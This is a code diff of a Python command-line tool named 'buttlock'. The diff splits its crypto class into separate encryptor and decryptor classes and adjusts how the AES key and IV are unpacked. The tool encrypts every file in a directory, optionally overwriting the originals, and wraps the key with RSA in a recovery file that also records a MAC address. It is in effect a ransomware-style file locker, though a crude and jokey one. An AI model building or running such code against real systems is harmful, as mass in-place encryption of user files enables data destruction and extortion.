@@ -1,4 +1,4 @@
-from core import Buttcrypt, Buttnet
+from core import Buttdecryptor, Buttnet, Buttencryptor
 import base64
 import click
 import os
@@ -17,9 +17,9 @@ def buttlock(mode, dir, recovery, replace):
         if not os.path.exists("./buttlock"):
             os.makedirs("./buttlock")
        
-        buttcrypt = Buttcrypt.Buttcrypt()
-        encrypted_aes_key = buttcrypt.RSAEncryptContent(buttcrypt.getAesKey())
-        base64_private_key = base64.b64encode(buttcrypt.getPrivateKey())
+        buttencrypt = Buttencryptor.Buttencryptor()
+        encrypted_aes_key = buttencrypt.RSAEncryptContent(buttencrypt.getAesKey())
+        base64_private_key = base64.b64encode(buttencrypt.getPrivateKey())
 
         with open("./buttlock/buttlock_recovery", "wb+") as crypto_out:
             crypto_out.write(encrypted_aes_key)
@@ -35,7 +35,7 @@ def buttlock(mode, dir, recovery, replace):
 
         for file in files:
             with open(file, "rb") as in_file:
-                encrypted_content = buttcrypt.encryptContent(in_file.read())
+                encrypted_content = buttencrypt.encryptContent(in_file.read())
                 if replace == "replace":
                     with open(file, "wb+") as out_file:
                         out_file.write(encrypted_content)
@@ -53,8 +53,10 @@ def buttlock(mode, dir, recovery, replace):
             mac_address = crypto_in_arr[1]
             private_key = base64.b64decode(crypto_in_arr[2].strip())
 
-            buttcrypt = Buttcrypt.Buttcrypt()
-            decrypted_aes_key = buttcrypt.RSADecryptContent(base64.b64decode(encrypted_aes_key), private_key)
+            buttdecrypt = Buttdecryptor.Buttdecrypt()
+            decrypted_aes_key = buttdecrypt.RSADecryptContent(base64.b64decode(encrypted_aes_key), private_key)
+            aes_key = decrypted_aes_key[:32]
+            aes_iv = decrypted_aes_key[32:]
 
             source_dir = abspath(dir)
             print("un-dicking all files in: " + source_dir)
@@ -63,9 +65,13 @@ def buttlock(mode, dir, recovery, replace):
 
             for file in files:
                 with open(file, "rb") as encrypted_input:
-                    decrypted = buttcrypt.decryptContent(decrypted_aes_key, encrypted_input.read())
-                    with open(file, "wb") as out_file:
-                         out_file.write(decrypted)
+                    try:
+                        decrypted = buttdecrypt.decryptContent(aes_key, aes_iv, encrypted_input.read())
+                        with open(file, "wb") as out_file:
+                            out_file.write(decrypted)
+                    except Exception as e:
+                        print(e)
+                        print("not an encrypted file")
 
 
 
